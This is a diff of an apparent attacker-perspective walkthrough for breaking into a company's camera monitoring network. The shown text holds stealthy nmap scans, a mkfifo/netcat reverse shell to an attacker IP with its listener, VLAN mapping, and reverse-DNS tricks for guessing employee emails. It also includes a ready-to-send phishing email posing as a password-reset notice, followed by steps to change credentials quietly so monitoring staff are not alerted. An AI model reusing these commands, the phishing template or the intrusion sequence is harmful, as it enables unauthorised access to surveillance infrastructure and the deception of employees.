@@ -45,7 +45,9 @@ It has inside:
 To put this at the top of all pages to guarantee that if the victim enters any page, his IP address will be recorded.
 ________________________________________
 Now I have <IP> of the victim, that means I have the first step in the company to have access in camera monitor. Need to use a scanner:
+
 nmap -Pn -f -T1 -p 21,22,80,8080 <IP>
+
 <img width="356" height="42" alt="nmap" src="https://github.com/user-attachments/assets/06082f29-6608-43e6-a12e-722b3a2fd494" />
 
 Now I have port 80 open.
@@ -54,6 +56,7 @@ Let's open <IP>:80, a website works. Let's try to write a reverse shell in input
 Reverse shell:
 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker ip> 2299>/tmp/f
+
 On Kali terminal write:
 nc -lnvp 2299
 
@@ -105,15 +108,22 @@ Let's map the IP of VLAN 5:
 nmap -f -Pn x.x.5.0/24 (To know all IP given for camera and the record server)
 ________________________________________
 In OT things need to know hardware control and hack camera device because have (BusyBox).
+
 BusyBox is a lightweight Linux toolkit commonly embedded in IoT and OT devices like IP cameras. It provides command line utilities that, if exposed or configured poorly, can allow attackers to run system commands. Weak credentials or open shells (e.g., telnet/SSH) on BusyBox based cameras can lead to full device compromise.
 All cameras use ports like (SSH TCP 22, RTSP over TLS RTSPS – TCP 322/443 or SRTP for encrypted video stream transmission, ONVIF)
+
 At this time need use social engineering again because in company there is a significant lack of awareness regarding security and hacking.
+
 Make some OSINT about camera manufacturer to know design, reset the password, to make phishing email to send for employee who works in camera monitor center.
+
 How to know details from IP in VLAN to know email of employee?
+
 dig -x <IP>
 New technique used:
 If a box gives you an internal IP and reverse DNS returns example pc.corp.local, that’s usually a hint to guess usernames for login or email format, e.g., <name>@corp.local.
+
 Send him email:
+
 Subject: Important Security Notice – Please Update Your Password
 Dear [Client's Name],
 We hope this message finds you well.
@@ -129,7 +139,9 @@ Warm regards,
 [Your Name]
 [Your Position]
 CT Camera Company
-[0000000000] | [Email] | [https://CTCameraCompany
-After logging in through the phishing based password reset and accessing the internal web interface, the attacker proceeds to the real login page and changes the credentials quickly to avoid raising suspicion or alerting monitoring staff. At this stage, elevated access rights are obtained, allowing full visibility over the internal camera monitoring system. This demonstrates how a successful intrusion, combined with credential manipulation and social engineering, can result in high privilege control over OT based surveillance infrastructure.
+[0000000000] | [Email] | [https://CTCameraCompany]
 
 
+After logging in through the phishing based password reset and accessing the internal web interface, the attacker proceeds to the real login page and changes the credentials quickly to avoid raising suspicion or alerting monitoring staff. 
+
+At this stage, elevated access rights are obtained, allowing full visibility over the internal camera monitoring system. This demonstrates how a successful intrusion, combined with credential manipulation and social engineering, can result in high privilege control over OT based surveillance infrastructure.
